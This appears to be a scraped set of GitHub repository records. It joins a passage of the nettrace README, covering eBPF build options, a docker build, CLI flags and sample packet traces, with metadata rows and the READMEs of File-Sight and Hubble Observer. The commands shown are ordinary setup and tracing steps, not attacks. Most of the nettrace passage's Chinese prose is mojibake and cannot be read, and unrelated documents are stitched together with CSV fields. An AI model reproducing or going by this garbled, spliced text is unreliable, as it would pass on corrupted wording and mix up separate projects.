  ç”±äºŽé‡‡ç”¨å®Œå…¨çš„å†…è”ï¼Œè¿™ç§æ–¹å¼ç¼–è¯‘å‡ºæ¥çš„nettraceå·¥å…·çš„ä½“ç§¯ä¼šæ¯”å¸¸è§„çš„è¾ƒå¤§ã€‚

- **INIT**

  è®©BPFç¨‹åºåˆå§‹åŒ–æ‰€æœ‰çš„eventæ•°æ®ï¼Œè€Œä¸æ˜¯å±€éƒ¨åˆå§‹åŒ–ã€‚å¯¹äºŽå†…æ ¸ç‰ˆè¾ƒä½Žçš„æƒ…å†µï¼Œå¦‚æžœå‡ºçŽ°`bpf_perf_event_output`è°ƒç”¨å¤±è´¥çš„é”™è¯¯ï¼Œå¯ä»¥é€šè¿‡åˆ¶å®šè¿™ä¸ªå‚æ•°ä¸º1æ¥è§£å†³é—®é¢˜ã€‚`INLINE=1`æ¶µç›–äº†`INIT=1`ã€‚

- **NO_GLOBAL_DATA**ï¼š

  å¯¹äºŽä¸æ”¯æŒglobal dataçš„å†…æ ¸ç‰ˆæœ¬ï¼ˆå†…æ ¸ç‰ˆæœ¬åœ¨5.4ä»¥ä¸‹ï¼‰éœ€è¦æŒ‡å®šè¿™ä¸ªå‚æ•°ï¼Œä»Žè€Œç¦ç”¨global dataçš„ä¸€äº›ç‰¹æ€§ï¼š
  ```shell
  make NO_BTF=1 NO_GLOBAL_DATA=1 all
  ```

- **COMPAT**ï¼š

  ä¸Šé¢ä¸‰ç§çš„è”åˆã€‚å¯¹äºŽç‰ˆæœ¬è¾ƒä½Žçš„å†…æ ¸ï¼Œå¯ä»¥ç›´æŽ¥ä½¿ç”¨è¿™ä¸ªå‚æ•°æ¥ä½¿èƒ½ä¸Šé¢çš„ä¸‰ä¸ªå‚æ•°ã€‚

- **OUTPUT_WHOLE**:

  é‡‡ç”¨å…¨é‡çš„æ–¹å¼è¾“å‡ºäº‹ä»¶ï¼ˆæ›´å¤šçš„å¼€é”€ï¼‰ã€‚å½“åŠ è½½çš„æ—¶å€™å‡ºçŽ°ä»¥ä¸‹æŠ¥é”™ï¼Œå¯ä»¥å°è¯•æ·»åŠ è¿™ä¸ªç¼–è¯‘å‚æ•°æ¥è§£å†³ï¼š
  ```
  R5 min value is negative, either use unsigned or 'var &= const'
  ```

- **KERNEL**ï¼šæ‰‹åŠ¨æŒ‡å®šè¦ä½¿ç”¨çš„å†…æ ¸æºç ï¼ˆå†…æ ¸å¤´æ–‡ä»¶ï¼‰ï¼š

  ```shell
  make KERNEL=/home/ubuntu/kernel NO_BTF=1 all
  ```

  éœ€è¦å’ŒNO_BTFä¸€èµ·ä½¿ç”¨ï¼Œå› ä¸ºåŸºäºŽBTFç¼–è¯‘çš„è¯æ˜¯ä¸éœ€è¦å¤´æ–‡ä»¶çš„ã€‚

  **æ³¨æ„ï¼š** å…¼å®¹æ¨¡å¼ç¼–è¯‘å‡ºæ¥çš„nettraceå·¥å…·åªèƒ½è¿è¡Œåœ¨å’Œ`KERNEL`å†…æ ¸ç‰ˆæœ¬ç›¸åŒçš„çŽ¯å¢ƒä¸Šã€‚å¦‚æžœæ²¡æœ‰æŒ‡å®š`KERNEL`ï¼Œé‚£é‡‡ç”¨çš„å°±æ˜¯å½“å‰ç¼–è¯‘çŽ¯å¢ƒä¸Šçš„å†…æ ¸å¤´æ–‡ä»¶ï¼Œè¿™å°±è¦æ±‚ç¼–è¯‘çŽ¯å¢ƒå’Œè¿è¡ŒçŽ¯å¢ƒæ‰€ä½¿ç”¨çš„å†…æ ¸è¦å®Œå…¨ç›¸åŒæ‰èƒ½æ­£å¸¸è¿è¡Œã€‚å¦åˆ™ï¼Œä¼šå‘ç”Ÿæ„æƒ³ä¸åˆ°çš„æ„å¤–ã€‚

å¯¹äºŽå‘è¡Œç‰ˆç‰ˆæœ¬è¾ƒä½Žï¼Œéš¾ä»¥å®‰è£…é«˜ç‰ˆæœ¬clangçš„æƒ…å†µä¸‹ï¼Œå¯ä»¥åŸºäºŽdockeræ¥è¿›è¡Œä»£ç çš„ç¼–è¯‘ï¼Œå…·ä½“å¯å‚è€ƒ[2.4](#2.4-åŸºäºŽdockerç¼–è¯‘)ç« èŠ‚æ¥è¿›è¡Œå®‰è£…ã€‚

åŒæ—¶ï¼Œå¯¹äºŽ`ubuntu 16.04/ubuntu 18.04`ç³»ç»Ÿï¼Œå…¶å†…æ ¸ä¼¼ä¹Žå­˜åœ¨BUGï¼Œå³å…¶ä½¿ç”¨çš„å†…æ ¸ç‰ˆæœ¬å®žé™…ä¸º4.15.18ï¼Œunameçœ‹åˆ°çš„å´æ˜¯4.15.0ã€‚è¿™å¯¼è‡´äº†åŠ è½½eBPFç¨‹åºçš„æ—¶å€™å†…æ ¸ç‰ˆæœ¬ä¸ä¸€è‡´ï¼Œæ— æ³•åŠ è½½ã€‚å› æ­¤å¯¹äºŽè¿™ç§æƒ…å†µï¼Œå¯ä»¥ä½¿ç”¨KERN_VERå‚æ•°æ¥æ‰‹åŠ¨æŒ‡å®šå†…æ ¸ç‰ˆæœ¬ï¼ˆè®¡ç®—æ–¹å¼ä¸ºï¼š`(4<<16) + (15<<8) + 18`ï¼‰ï¼š

```shell
make KERN_VER=266002 COMPAT=1 all
```

**æ³¨æ„ï¼š** è¿™é‡Œæœ€åŽä¸€ä¸ªç‰ˆæœ¬å·å¦‚æžœè¿‡å¤§ï¼Œè¶…è¿‡äº†255ï¼Œé‚£ä¹ˆå°±å–255ã€‚ä¾‹å¦‚ï¼Œå¯¹äºŽ4.19.282ï¼Œå°±è¦æŒ‰ç…§`(4<<16) + (19<<8) + 255`çš„æ–¹å¼æ¥è®¡ç®—ã€‚

#### 2.3.3 æ‰“åŒ…

ä½¿ç”¨å‘½ä»¤`make rpm`å¯åˆ¶ä½œrpmåŒ…ï¼›ä½¿ç”¨å‘½ä»¤`make pack`å¯åˆ¶ä½œäºŒè¿›åˆ¶åŒ…ï¼ˆäºŒè¿›åˆ¶ç¨‹åºæ‰“åŒ…åˆ°åŽ‹ç¼©åŒ…ä¸­ï¼Œé»˜è®¤å­˜æ”¾è·¯å¾„ä¸ºoutputæ–‡ä»¶å¤¹ï¼‰ã€‚

### 2.4 åŸºäºŽdockerç¼–è¯‘

å¯¹äºŽ**æ”¯æŒBTF**çš„å†…æ ¸ï¼Œæ— éœ€å®‰è£…ä»»ä½•ä¾èµ–ï¼Œå¯ä»¥ç›´æŽ¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥è¿›è¡Œnettraceçš„ç¼–è¯‘ï¼š

```shell
docker run -it --rm --network=host --privileged -v $(pwd):$(pwd) -v /lib/modules/:/lib/modules/ -v /usr/src/:/usr/src/ imagedong/nettrace-build make -C $(pwd) all
```

å¯¹äºŽ**ä¸æ”¯æŒBTF**çš„ç³»ç»Ÿï¼Œè¿™éœ€è¦å…ˆå®‰è£…`kernel-headers`è½¯ä»¶åŒ…ï¼Œå¦‚ä¸Šé¢çš„æ‰‹åŠ¨ç¼–è¯‘é‡Œé¢æ‰€è¯´çš„ã€‚ubuntuç³»ç»Ÿä½¿ç”¨å‘½ä»¤`apt install linux-headers-$(uname -r) -y`è¿›è¡Œå®‰è£…ï¼›centosä½¿ç”¨å‘½ä»¤`yum install kernel-headers kernel-devel -y`è¿›è¡Œå®‰è£…ã€‚ç„¶åŽä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤è¿›è¡Œç¼–è¯‘ï¼š

```shell
docker run -it --rm --network=host --privileged -v $(pwd):$(pwd) -v /lib/modules/:/lib/modules/ -v /usr/src/:/usr/src/ imagedong/nettrace-build make -C $(pwd) NO_BTF=1 all
```

**æ³¨æ„ï¼š** å…¼å®¹æ¨¡å¼ç¼–è¯‘å‡ºæ¥çš„nettraceå·¥å…·åªèƒ½è¿è¡Œåœ¨å’Œ`KERNEL`å†…æ ¸ç‰ˆæœ¬ç›¸åŒçš„çŽ¯å¢ƒä¸Šã€‚å¦‚æžœæ²¡æœ‰æŒ‡å®š`KERNEL`ï¼Œé‚£é‡‡ç”¨çš„å°±æ˜¯å½“å‰ç¼–è¯‘çŽ¯å¢ƒä¸Šçš„å†…æ ¸å¤´æ–‡ä»¶ï¼Œè¿™å°±è¦æ±‚ç¼–è¯‘çŽ¯å¢ƒå’Œè¿è¡ŒçŽ¯å¢ƒæ‰€ä½¿ç”¨çš„å†…æ ¸è¦å®Œå…¨ç›¸åŒæ‰èƒ½æ­£å¸¸è¿è¡Œã€‚å¦åˆ™ï¼Œä¼šå‘ç”Ÿæ„æƒ³ä¸åˆ°çš„æ„å¤–ã€‚

**æ³¨æ„ï¼š** dockeré•œåƒå¯èƒ½ä¼šæ›´æ–°ï¼Œä¸ºäº†ä½¿ç”¨æœ€æ–°çš„é•œåƒï¼Œå»ºè®®å…ˆè¯•ç”¨å‘½ä»¤`docker pull imagedong/nettrace-build`æ¥èŽ·å–æœ€æ–°çš„å®¹å™¨é•œåƒã€‚

## ä¸‰ã€ä½¿ç”¨æ–¹æ³•

nettraceæ˜¯ç”¨æ¥è·Ÿè¸ªå†…æ ¸æŠ¥æ–‡å’Œè¯Šæ–­ç½‘ç»œæ•…éšœçš„ï¼Œåœ¨è¿›è¡ŒæŠ¥æ–‡è·Ÿè¸ªæ—¶å¯ä»¥ä½¿ç”¨ä¸€å®šçš„è¿‡æ»¤æ¡ä»¶æ¥è·Ÿè¸ªç‰¹å®šçš„æŠ¥æ–‡ã€‚å…¶åŸºæœ¬å‘½ä»¤è¡Œå‚æ•°ä¸ºï¼š

```
$ nettrace -h
nettrace: a tool to trace skb in kernel and diagnose network problem

Usage:
    -s, --saddr      filter source ip/ipv6 address
    -d, --daddr      filter dest ip/ipv6 address
    --addr           filter source or dest ip/ipv6 address
    -S, --sport      filter source TCP/UDP port
    -D, --dport      filter dest TCP/UDP port
    -P, --port       filter source or dest TCP/UDP port
    -p, --proto      filter L3/L4 protocol, such as 'tcp', 'arp'
    --netns          filter by net namespace inode
    --netns-current  filter by current net namespace
    --pid            filter by current process id(pid)
    --min-latency    filter by the minial time to live of the skb in us
    --pkt-len        filter by the IP packet length (include header) in byte
    --tcp-flags      filter by TCP flags, such as: SAPR

    --basic          use 'basic' trace mode, don't trace skb's life
    --diag           enable 'diagnose' mode
    --diag-quiet     only print abnormal packet
    --diag-keep      don't quit when abnormal packet found
    --drop           skb drop monitor mode, for replace of 'droptrace'
    --drop-stack     print the kernel function call stack of kfree_skb
    --sock           enable 'sock' mode
    --monitor        enable 'monitor' mode
    --rtt            enable 'rtt' in statistics mode
    --rtt-detail     enable 'rtt' in detail mode
    --filter-srtt    filter by the minial first-acked rtt in ms
    --filter-minrtt  filter by the minial last-acked rtt in ms
    --latency-show   show latency between kernel functions
    --latency-free   account the latency of skb free
    --latency        enable 'latency' mode
    --latency-summary
                     show latency by statistics

    -t, --trace      enable trace group or trace. Some traces are disabled by default, use ""all"" to enable all
    --force          skip some check and force load nettrace
    --ret            show function return value
    --detail         show extern packet info, such as pid, ifname, etc
    --date           print timestamp in date-time format
    -c, --count      exit after receiving count packets
    --hooks          print netfilter hooks if dropping by netfilter
    --tiny-show      set this option to show less infomation
    --trace-stack    print call stack for traces or group
    --trace-matcher  traces that can match packet(default all)
    --trace-exclude  traces that should be disabled
    --trace-noclone  don't trace skb clone
    --trace-free     custom the free functions
    --func-stats     only do the statistics for function call
    --rate-limit     limit the output to N/s, not valid in diag/default mode
    --btf-path       custom the path of BTF info of vmlinux

    -v               show log information
    --debug          show debug information
    -h, --help       show help information
    -V, --version    show nettrace version
```

**è¿‡æ»¤ç±»å‚æ•°**

å‚æ•°`s/d/addr/S/D/port/p/pid`ç”¨äºŽè¿›è¡ŒæŠ¥æ–‡çš„è¿‡æ»¤ï¼Œå¯ä»¥é€šè¿‡IPåœ°å€ï¼ˆåŒ…æ‹¬IPv6åœ°å€ï¼‰ã€ç«¯å£ã€åè®®ç­‰å±žæ€§è¿›è¡Œè¿‡æ»¤ã€‚å…¶ä»–å‚æ•°çš„ç”¨é€”åŒ…æ‹¬ï¼š

- `netns`ï¼šæ ¹æ®ç½‘ç»œå‘½åç©ºé—´è¿›è¡Œè¿‡æ»¤ï¼Œè¯¥å‚æ•°åŽé¢è·Ÿçš„æ˜¯ç½‘ç»œå‘½åç©ºé—´çš„inodeï¼Œå¯ä»¥é€šè¿‡`ls -l /proc/<pid>/ns/net`æ¥æŸ¥çœ‹å¯¹åº”è¿›ç¨‹çš„ç½‘ç»œå‘½åç©ºé—´çš„inodeå·
- `netns-current`ï¼šä»…æ˜¾ç¤ºå½“å‰ç½‘ç»œå‘½åç©ºé—´çš„æŠ¥æ–‡ï¼Œç­‰ä»·äºŽ`--netns å½“å‰ç½‘ç»œå‘½åç©ºé—´çš„inode`
- `pid`ï¼šæ ¹æ®å½“å‰å¤„ç†æŠ¥æ–‡çš„è¿›ç¨‹çš„IDè¿›è¡Œè¿‡æ»¤
- `min-latency`ï¼šæ ¹æ®æŠ¥æ–‡çš„å¯¿å‘½è¿›è¡Œè¿‡æ»¤ï¼Œä»…æ‰“å°å¤„ç†æ—¶é•¿è¶…è¿‡è¯¥å€¼çš„æŠ¥æ–‡ï¼Œå•ä½ä¸ºusã€‚è¯¥å‚æ•°ä»…åœ¨`é»˜è®¤`/`diag`/`latency`æ¨¡å¼ä¸‹å¯ç”¨ã€‚
- `pkt-len`ï¼šæ ¹æ®IPæŠ¥æ–‡æ€»é•¿åº¦ï¼ˆåŒ…æ‹¬æŠ¥æ–‡å¤´éƒ¨ï¼‰æ¥è¿›è¡Œè¿‡æ»¤
- `tcp-flags`ï¼šæ ¹æ®TCPæŠ¥æ–‡çš„flagsè¿›è¡Œè¿‡æ»¤ï¼Œæ”¯æŒçš„flagåŒ…æ‹¬ï¼šSAPRF

**æ¨¡å¼ç±»å‚æ•°**

- `basic`ï¼šå¯ç”¨`basic`è·Ÿè¸ªæ¨¡å¼ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå¯ç”¨çš„æ˜¯ç”Ÿå‘½å‘¨æœŸè·Ÿè¸ªæ¨¡å¼ã€‚å¯ç”¨è¯¥æ¨¡å¼åŽï¼Œä¼šç›´æŽ¥æ‰“å°å‡ºæŠ¥æ–‡æ‰€ç»è¿‡çš„å†…æ ¸å‡½æ•°/tracepointã€‚
- `diag`ï¼šå¯ç”¨è¯Šæ–­æ¨¡å¼
- `diag-quiet`ï¼šåªæ˜¾ç¤ºå‡ºçŽ°å­˜åœ¨é—®é¢˜çš„æŠ¥æ–‡ï¼Œä¸æ˜¾ç¤ºæ­£å¸¸çš„æŠ¥æ–‡
- `diag-keep`ï¼šæŒç»­è·Ÿè¸ªã€‚`diag`æ¨¡å¼ä¸‹ï¼Œé»˜è®¤åœ¨è·Ÿè¸ªåˆ°å¼‚å¸¸æŠ¥æ–‡åŽä¼šåœæ­¢è·Ÿè¸ªï¼Œä½¿ç”¨è¯¥å‚æ•°åŽï¼Œä¼šæŒç»­è·Ÿè¸ªä¸‹åŽ»ã€‚
- `drop`ï¼šè¿›è¡Œç³»ç»Ÿä¸¢åŒ…ç›‘æŽ§ï¼Œå–ä»£åŽŸå…ˆçš„`droptrace`
- `drop-stack`: æ‰“å°kfree_skbå†…æ ¸å‡½æ•°çš„è°ƒç”¨å †æ ˆï¼Œç­‰ä»·äºŽ`--trace-stack kfree_skb`
- `sock`ï¼šå¯ç”¨å¥—æŽ¥å£æ¨¡å¼ã€‚è¿™ä¸ªæ¨¡å¼ä¸‹ï¼Œä¸ä¼šå†è·Ÿè¸ªæŠ¥æ–‡ï¼Œè€Œä¼šè·Ÿè¸ªå¥—æŽ¥å£ã€‚
- `monitor`ï¼šå¯ç”¨ç›‘æŽ§æ¨¡å¼ã€‚ä¸€ç§è½»é‡åŒ–çš„å®žæ—¶ç›‘æŽ§ç³»ç»Ÿä¸­ç½‘ç»œå¼‚å¸¸çš„æ¨¡å¼ï¼ˆå¯¹å†…æ ¸ç‰ˆæœ¬æœ‰ä¸€å®šè¦æ±‚ï¼‰ã€‚
- `rtt`ï¼šå¯ç”¨RTTç»Ÿè®¡æ¨¡å¼ï¼Œä¼šç»Ÿè®¡TCP RTTçš„åˆ†å¸ƒæƒ…å†µ
- `rtt-detail`ï¼šå¯ç”¨RTTè¯¦ç»†æ¨¡å¼ï¼Œè¾“å‡ºç¬¦åˆè¿‡æ»¤æ¡ä»¶çš„æ¯ä¸ªæŠ¥æ–‡çš„RTTæ•°æ®
- `filter-srtt`ï¼šæ ¹æ®srttæ¥è¿›è¡Œè¿‡æ»¤ï¼Œ`rtt/rtt-detail`æ¨¡å¼ä¸‹å¯ç”¨ï¼Œå•ä½ms
- `filter-minrtt`ï¼šæ ¹æ®minrttæ¥è¿›è¡Œè¿‡æ»¤ï¼Œ`rtt/rtt-detail`æ¨¡å¼ä¸‹å¯ç”¨ï¼Œå•ä½ms
- `latency-show`ï¼šæ˜¾ç¤ºå»¶è¿Ÿï¼ˆåè®®æ ˆå¤„ç†è€—æ—¶ï¼‰ä¿¡æ¯ï¼Œ`basic/sock`æ¨¡å¼ä¸‹ä¸å¯ç”¨
- `latency`ï¼šå¯ç”¨å»¶è¿Ÿåˆ†æžæ¨¡å¼ï¼Œå¯ä»¥é«˜æ•ˆåˆ†æžæ¯ä¸ªæŠ¥æ–‡åè®®æ ˆå¤„ç†è€—æ—¶
- `latency-summary`ï¼šå¯ç”¨å»¶è¿Ÿåˆ†æžç»Ÿè®¡æ¨¡å¼ï¼Œå¯ä»¥ç»Ÿè®¡åè®®æ ˆå¤„ç†è€—æ—¶çš„åˆ†å¸ƒæƒ…å†µ

**æ˜¾ç¤ºç±»å‚æ•°**

- `t/trace`ï¼šè¦å¯ç”¨çš„è·Ÿè¸ªæ¨¡å—ï¼Œé»˜è®¤å¯ç”¨æ‰€æœ‰
- `ret`ï¼šè·Ÿè¸ªå’Œæ˜¾ç¤ºå†…æ ¸å‡½æ•°çš„è¿”å›žå€¼
- `detail`ï¼šæ˜¾ç¤ºè·Ÿè¸ªè¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬å½“å‰çš„è¿›ç¨‹ã€ç½‘å£å’ŒCPUç­‰ä¿¡æ¯
- `date`ï¼šä»¥æ—¶é—´æ ¼å¼æ‰“å°ï¼ˆä»¥2022-10-24 xx:xx:xx.xxxxxxæ ¼å¼æ‰“å°ï¼‰ï¼Œè€Œä¸æ˜¯æ—¶é—´æˆ³
- `c/count`ï¼šæŒ‡å®šè¦è·Ÿè¸ªçš„æŠ¥æ–‡ä¸ªæ•°cï¼Œè¾¾åˆ°è¯¥ä¸ªæ•°åŽè‡ªåŠ¨é€€å‡º
- `hooks`ï¼šç»“åˆnetfilteråšçš„é€‚é…ï¼Œè¯¦è§ä¸‹æ–‡
- `tiny-show`ï¼šç²¾ç®€æ˜¾ç¤ºï¼Œåªæ˜¾ç¤ºç¬¬ä¸€ä¸ªæŠ¥æ–‡çš„å†…å®¹ï¼Œç”¨äºŽæå‡æ€§èƒ½
- `trace-stack`ï¼šæŒ‡å®šéœ€è¦è¿›è¡Œå †æ ˆæ‰“å°çš„å†…æ ¸å‡½æ•°ï¼Œå¯ä»¥æŒ‡å®šå¤šä¸ªï¼Œç”¨â€œ,â€åˆ†éš”ã€‚
- `trace-matcher`ï¼šæŒ‡å®šè¿›è¡ŒæŠ¥æ–‡åŒ¹é…çš„å†…æ ¸å‡½æ•°ï¼Œé»˜è®¤æ‰€æœ‰çš„å‡½æ•°ï¼Œç”¨äºŽæå‡æ€§èƒ½
- `trace-exclude`ï¼šä¸è¿›è¡Œè·Ÿè¸ªçš„å‡½æ•°
- `trace-noclone`ï¼šä¸è·Ÿè¸ªæŠ¥æ–‡çš„å…‹éš†æ—¶é—´ï¼Œå³ä¸æŠŠå…‹éš†å‡ºæ¥çš„æŠ¥æ–‡å’Œå½“å‰æŠ¥æ–‡æ”¾åˆ°ä¸€å—è·Ÿè¸ª
- `func-stats`ï¼šåªç»Ÿè®¡å†…æ ¸å‡½æ•°è¢«è°ƒç”¨çš„æ¬¡æ•°ï¼Œä¸æ‰“å°å…·ä½“çš„æŠ¥æ–‡ï¼Œå¯æŒ‡å®šè¿‡æ»¤æ¡ä»¶
- `rate-limit`ï¼šè¿›è¡Œé™é€Ÿï¼Œé™åˆ¶æ¯ç§’äº‹ä»¶è¾“å‡ºçš„æ•°é‡
- `btf-path`ï¼šæ‰‹åŠ¨æŒ‡å®šBTFæ–‡ä»¶çš„è·¯å¾„

### 3.1 ç”Ÿå‘½å‘¨æœŸ

é»˜è®¤æƒ…å†µä¸‹ï¼Œ`nettrace`ä¼šè·Ÿè¸ªæŠ¥æ–‡ä»Žè¿›å…¥åˆ°å†…æ ¸åè®®æ ˆåˆ°ç¦»å¼€ï¼ˆé”€æ¯ï¼‰çš„è¿‡ç¨‹ã€‚å¯¹äºŽæœ‰ä¸€å®šå†…æ ¸ç½‘ç»œç»éªŒçš„äººæ¥è¯´ï¼Œå¯ä»¥é€šè¿‡æŠ¥æ–‡çš„å†…æ ¸è·¯å¾„æ¥å¿«é€ŸæŽ¨æ–­å‡ºå½“å‰çš„ç½‘ç»œé—®é¢˜ï¼Œè¾¾åˆ°å¿«é€Ÿå®šä½çš„ç›®çš„ã€‚

#### 3.1.1 è·Ÿè¸ªpingæŠ¥æ–‡

```shell
sudo ./nettrace -p icmp --saddr 169.254.128.15
begin trace...
***************** e8fbc700,e8fbdc00 ***************
[1273445.360831] [dev_gro_receive     ] ICMP: 169.254.128.15 -> 172.27.0.6 ping request, seq: 54754
[1273445.360844] [__netif_receive_skb_core] ICMP: 169.254.128.15 -> 172.27.0.6 ping request, seq: 54754
[1273445.360847] [ip_rcv              ] ICMP: 169.254.128.15 -> 172.27.0.6 ping request, seq: 54754
[1273445.360850] [ip_rcv_core         ] ICMP: 169.254.128.15 -> 172.27.0.6 ping request, seq: 54754
[1273445.360854] [skb_clone           ] ICMP: 169.254.128.15 -> 172.27.0.6 ping request, seq: 54754
[1273445.360861] [nf_hook_slow        ] ICMP: 169.254.128.15 -> 172.27.0.6 ping request, seq: 54754
[1273445.360868] [nft_do_chain        ] ICMP: 169.254.128.15 -> 172.27.0.6 ping request, seq: 54754
[1273445.360875] [ip_rcv_finish       ] ICMP: 169.254.128.15 -> 172.27.0.6 ping request, seq: 54754
[1273445.360878] [ip_route_input_slow ] ICMP: 169.254.128.15 -> 172.27.0.6 ping request, seq: 54754
[1273445.360882] [fib_validate_source ] ICMP: 169.254.128.15 -> 172.27.0.6 ping request, seq: 54754
[1273445.360887] [ip_local_deliver    ] ICMP: 169.254.128.15 -> 172.27.0.6 ping request, seq: 54754
[1273445.360890] [nf_hook_slow        ] ICMP: 169.254.128.15 -> 172.27.0.6 ping request, seq: 54754
[1273445.360895] [ip_local_deliver_finish] ICMP: 169.254.128.15 -> 172.27.0.6 ping request, seq: 54754
[1273445.360899] [icmp_rcv            ] ICMP: 169.254.128.15 -> 172.27.0.6 ping request, seq: 54754
[1273445.360903] [icmp_echo           ] ICMP: 169.254.128.15 -> 172.27.0.6 ping request, seq: 54754
[1273445.360908] [icmp_reply          ] ICMP: 169.254.128.15 -> 172.27.0.6 ping request, seq: 54754
[1273445.360922] [consume_skb         ] ICMP: 169.254.128.15 -> 172.27.0.6 ping request, seq: 54754
[1273445.360930] [packet_rcv          ] ICMP: 169.254.128.15 -> 172.27.0.6 ping request, seq: 54754
[1273445.360933] [consume_skb         ] ICMP: 169.254.128.15 -> 172.27.0.6 ping request, seq: 54754
```

ä¸Šé¢çš„*ä¸­é—´çš„è¡¨ç¤ºå½“å‰æ‰€è·Ÿè¸ªçš„skbçš„åœ°å€ï¼Œç”±äºŽå½“å‰çš„æŠ¥æ–‡è¢«å…‹éš†è¿‡ï¼Œå› æ­¤å½“å‰è·Ÿè¸ªä¸Šä¸‹æ–‡å­˜åœ¨ä¸¤ä¸ªæŠ¥æ–‡ã€‚å¦‚æžœä¸æƒ³è·Ÿè¸ªè¢«å…‹éš†çš„æŠ¥æ–‡ï¼ˆä¸æƒ³å°†è¢«å…‹éš†çš„æŠ¥æ–‡å’ŒåŽŸæŠ¥æ–‡ä¸€èµ·æ˜¾ç¤ºï¼‰ï¼Œé‚£ä¹ˆå¯ä»¥åŠ ä¸ª`--trace-noclone`å‚æ•°ã€‚

#### 3.1.2 æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯

```shell
sudo ./nettrace -p icmp --saddr 169.254.128.15 --detail
begin trace...
***************** e8fbcd00,e8fbcc00 ***************
[1273732.110173] [e8fbcd00][dev_gro_receive     ][cpu:40 ][ens5 ][pid:0      ][swapper/40  ] ICMP: 169.254.128.15 -> 172.27.0.6 ping request, seq: 56464
[1273732.110185] [e8fbcd00][__netif_receive_skb_core][cpu:40 ][ens5 ][pid:0      ][swapper/40  ] ICMP: 169.254.128.15 -> 172.27.0.6 ping request, seq: 56464
[1273732.110189] [e8fbcd00][ip_rcv              ][cpu:40 ][ens5 ][pid:0      ][swapper/40  ] ICMP: 169.254.128.15 -> 172.27.0.6 ping request, seq: 56464
[1273732.110192] [e8fbcd00][ip_rcv_core         ][cpu:40 ][ens5 ][pid:0      ][swapper/40  ] ICMP: 169.254.128.15 -> 172.27.0.6 ping request, seq: 56464
[1273732.110196] [e8fbcd00][skb_clone           ][cpu:40 ][ens5 ][pid:0      ][swapper/40  ] ICMP: 169.254.128.15 -> 172.27.0.6 ping request, seq: 56464
[1273732.110204] [e8fbcc00][nf_hook_slow        ][cpu:40 ][ens5 ][pid:0      ][swapper/40  ] ICMP: 169.254.128.15 -> 172.27.0.6 ping request, seq: 56464
[1273732.110211] [e8fbcc00][nft_do_chain        ][cpu:40 ][ens5 ][pid:0      ][swapper/40  ] ICMP: 169.254.128.15 -> 172.27.0.6 ping request, seq: 56464
[1273732.110222] [e8fbcc00][ip_rcv_finish       ][cpu:40 ][ens5 ][pid:0      ][swapper/40  ] ICMP: 169.254.128.15 -> 172.27.0.6 ping request, seq: 56464
[1273732.110229] [e8fbcc00][ip_route_input_slow ][cpu:40 ][ens5 ][pid:0      ][swapper/40  ] ICMP: 169.254.128.15 -> 172.27.0.6 ping request, seq: 56464
[1273732.110234] [e8fbcc00][fib_validate_source ][cpu:40 ][ens5 ][pid:0      ][swapper/40  ] ICMP: 169.254.128.15 -> 172.27.0.6 ping request, seq: 56464
[1273732.110240] [e8fbcc00][ip_local_deliver    ][cpu:40 ][ens5 ][pid:0      ][swapper/40  ] ICMP: 169.254.128.15 -> 172.27.0.6 ping request, seq: 56464
[1273732.110243] [e8fbcc00][nf_hook_slow        ][cpu:40 ][ens5 ][pid:0      ][swapper/40  ] ICMP: 169.254.128.15 -> 172.27.0.6 ping request, seq: 56464
[1273732.110252] [e8fbcc00][ip_local_deliver_finish][cpu:40 ][ens5 ][pid:0      ][swapper/40  ] ICMP: 169.254.128.15 -> 172.27.0.6 ping request, seq: 56464
[1273732.110255] [e8fbcc00][icmp_rcv            ][cpu:40 ][ens5 ][pid:0      ][swapper/40  ] ICMP: 169.254.128.15 -> 172.27.0.6 ping request, seq: 56464
[1273732.110260] [e8fbcc00][icmp_echo           ][cpu:40 ][ens5 ][pid:0      ][swapper/40  ] ICMP: 169.254.128.15 -> 172.27.0.6 ping request, seq: 56464
[1273732.110267] [e8fbcc00][icmp_rep"
preetpalbugs/linux-ebpf-profiler,1,0,1,0,Python,A real-time Linux file open profiler built with eBPF and Python. A project to explore systems programming and kernel observability.,2025-09-07T10:54:32Z,2025-09-18T20:43:30Z,2,"# File-Sight: A Real-Time Linux File Open Profiler using eBPF



## ðŸš€ What is File-Sight?

File-Sight is a simple yet powerful command-line tool for Linux that provides a real-time view of the most frequently opened files on your system. It uses eBPF technology to safely and efficiently trace file open events directly from the kernel, offering deep insights into system behavior.

This project was built as a personal learning exercise to understand the fundamentals of eBPF, BCC, and systems programming.

---

## âœ¨ Features

- **Real-Time Monitoring:** See which files are being accessed across your entire system, live.
- **Top 10 View:** Automatically aggregates and displays the top 10 most active files.
- **Low Overhead:** Built with eBPF to be highly efficient and safe to run on live systems.

---

## ðŸ”§ How it Works

The tool is a Python script that leverages the BCC framework.
1.  An eBPF program written in C is loaded into the kernel.
2.  This program is attached to the `do_sys_openat2` kernel function, which is a key function for handling file opens.
3.  Every time a file is opened, the eBPF program stores the filename in an eBPF map and increments its count.
4.  The Python script reads this map and displays the top 10 results in a clean, formatted table.

---

## ðŸ› ï¸ How to Use

### Prerequisites
- Linux system with kernel headers installed
- `bpfcc-tools` and `python3-bpfcc`

```bash
# Install dependencies (Debian/Ubuntu)
sudo apt update
sudo apt install bpfcc-tools python3-bpfcc

# Clone the repository
git clone [https://github.com/your-username/ebpf-file-profiler.git](https://github.com/your-username/ebpf-file-profiler.git)
cd ebpf-file-profiler

# Run the tool
sudo ./file_profiler.py
"
onzack/hubble-observer,10,2,10,0,Smarty,The Hubble Observer is a small observability component that monitors network flows within Cilium.,2025-06-12T21:20:03Z,2025-10-08T11:50:51Z,51,"<div align=""center"">
<img src=""assets/hubble-observer_background.png"" alt=""Hubble Observer Logo"" width=""500"">
</div>

# Hubble Observer

The Hubble Observer is a small observability component that monitors network flows within Cilium.

The Hubble Observer includes a Grafana dashboard for visualizing Cilium network flows. Here's a preview of the dashboard:

[![Grafana Dashboard Preview](assets/grafanadashboard.png)](https://grafana.com/grafana/dashboards/23862)

## Prerequisites

Before installing the Hubble Observer, ensure you have the following components installed in your Kubernetes cluster:

1. **Hubble Relay**
   - Required to connect to all Cilium pods and export the flows.

1. **Grafana Operator**
   - Required for deploying the Grafana dashboard. (you can disable this: `grafanaDashboard.enabled=false`)
   - Installation instructions: [Grafana Operator Documentation](https://github.com/grafana/grafana-operator)

1. **Loki**
   - Required for log aggregation and querying
